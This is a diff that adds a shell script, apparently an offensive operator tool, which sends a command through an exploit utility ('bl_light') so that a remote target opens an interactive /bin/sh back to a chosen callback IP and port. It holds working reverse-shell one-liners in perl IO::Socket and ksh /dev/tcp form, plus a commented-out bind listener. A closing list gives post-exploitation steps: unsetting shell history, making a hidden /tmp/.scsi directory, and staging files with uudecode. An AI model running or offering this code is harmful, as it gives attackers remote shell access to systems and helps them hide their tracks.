@@ -1,0 +1,136 @@
+#!/bin/sh
+VER=1.0.0.1
+##########################################################
+### Generate & run a shell callback (via perl) on target.
+##########################################################
+
+# Some default values
+CALLBACK_PORT=`mkrandom -n 2>/dev/null`
+[ "$CALLBACK_PORT" ] || CALLBACK_PORT=32177
+PROGNAME=`basename $0`
+
+usage() {
+    echo $PROGNAME v.$VER
+    [ "$1" = "v" ] && exit 1
+    cat <<EOF
+
+$PROGNAME uses bl_light to start a callback on the remote target
+using its perl (to include IO::Socket::INET). A perl command is shown to
+you, and if you do not abort it is sent up via bl_light. The perl, if
+executed, will cause an interactive /bin/sh shell to call back to the
+callback IP and port.
+
+Prior to sending the exploit, you should run this locally in a
+scripted window:
+
+   doublet CALLBACK_PORT
+
+Usage: ${0} [options]
+  -i <target ip>          (required)
+  -l <callback ip>        (required)
+  -p <callback port>      (random by default)
+  -P /path                (path perl lives in, defaults to searching \$PATH)
+EOF
+
+    [ "$*" ] && echo -e "\a\n\nERROR: $*\n"
+    exit 1
+}
+
+# There must be at least one argument
+if [ ${#} -eq 0 ]; then
+    usage
+fi
+
+#
+# Process args
+#
+    while getopts i:p:hvl:P: op; do
+        case $op in
+	h|v) usage $op;;
+        i)  TARGET_IP="$OPTARG";;
+	l)  CALLBACK_IP="$OPTARG";;
+	p)  CALLBACK_PORT="$OPTARG";;
+	P)  PERLPATH="$OPTARG/";;
+        esac
+    done
+    cmdFlag="-c"
+    shift `expr $OPTIND - 1`
+
+# Check for required args
+[ -z "$TARGET_IP" ] && echo "Error: missing remote IP -i argument" && usage
+[ -z "$CALLBACK_PORT" ] && echo "Error: missing remote port -p argument" && usage
+if [ ! "${PERLPATH:0:1}" = "/" ] ; then
+    usage "-P argument \"$PERLPATH\" must start with /"
+fi
+PERLPATH=`echo "$PERLPATH" | sed "s,//,/,g"`
+PERLLEN=`echo -n $PERLPATH | wc -c`
+PERLLEN=$((PERLLEN-4))
+PERLTEST=${PERLPATH:$PERLLEN}
+
+if [ "$PERLTEST" = "perl" ] ; then
+    echo -e "Your path (-P) argument ends in \"perl\", so we will be running:\n\n"
+    echo -e "    $PERLPATH/perl\n\n"
+    echo -en "^C to abort now if that is wrong, or hit return to continue. "
+    read blah
+fi
+
+if [ "${TARGET_IP:0:3}" = "127" ] ; then
+    echo -e "For your NOPEN tunnel window:\n\nr $CALLBACK_PORT\n"
+fi
+
+echo -e "For the shell callback (doublet requires a scripted window)"
+echo -e "\n   doublet $CALLBACK_PORT\n"
+
+# Listener respawns for ten minutes
+RUN_WHAT="exec \\\"/bin/sh\\\""
+
+#CMD="/sbin/sh -c (perl -MIO -e 'if (\$k=fork){\$i=$BURNAT;while(\$i--){sleep 1};kill(9,\$k);exit}chdir(\"/tmp\");while(\$c=new IO::Socket::INET(LocalPort,$CALLBACK_PORT,Reuse,1,Listen)->accept){\$~->fdopen(\$c,w);STDIN->fdopen(\$c,r);STDERR->fdopen(\$c,w);$RUN_WHAT}')&"
+CMD="/bin/sh -c (perl -MIO -e 'use IO::Socket::INET;if (\\\$k=fork){\\\$i=$BURNAT;while(\\\$i--){sleep 1};kill(9,\\\$k);exit}chdir(\"/tmp\");while(\\\$c=new IO::Socket::INET(LocalPort,$CALLBACK_PORT,Reuse,1,Listen)->accept){\\\$~->fdopen(\\\$c,w);STDIN->fdopen(\\\$c,r);STDERR->fdopen(\\\$c,w);$RUN_WHAT}')&"
+CMD=" /bin/ksh -c '/bin/sh < /dev/tcp/$CALLBACK_IP/$CALLBACK_PORT >&0 2>&0'"
+
+CMD="${PERLPATH}perl -e 'use IO::Socket;use IO::Handle;\\\$s=IO::Socket::INET->new(\"$CALLBACK_IP:$CALLBACK_PORT\");close(STDIN);close(STDOUT);IO::Handle->new_from_fd(\\\$s,\"r\");open(STDIN,\"<\\\$_\");IO::Handle->new_from_fd(\\\$s,\"w\");open(STDOUT,\">\\\$_\");$RUN_WHAT;'"
+
+
+CMD2="`echo \"$CMD\" | sed 's,\\\,\\\\\\\\,g'`"
+
+    
+echo -e "Remote perl listener command will be: +$CMD+"
+
+cat <<EOF
+
+About to run this (but do NOT try pasting this...something wrong escapes-wise....):
+
+bl_light ${TARGET_IP} "$CMD"
+
+You can abort here with ^C, hit return to continue.
+
+EOF
+
+read blah
+
+echo "now running it..."
+
+./bl_light ${TARGET_IP} "$CMD"
+
+
+echo "Sent. Thank you for playing"
+
+
+
+cat <<EOF
+
+These might come in handy:
+
+unset HISTFILE
+unset HISTFILESIZE
+unset HISTSIZE
+w
+id
+uname -a
+ls -la /boot
+mkdir /tmp/.scsi;cd /tmp/.scsi;pwd
+which uudecode uncompress
+        # gedit sendmail
+uudecode; ls -la
+
+EOF
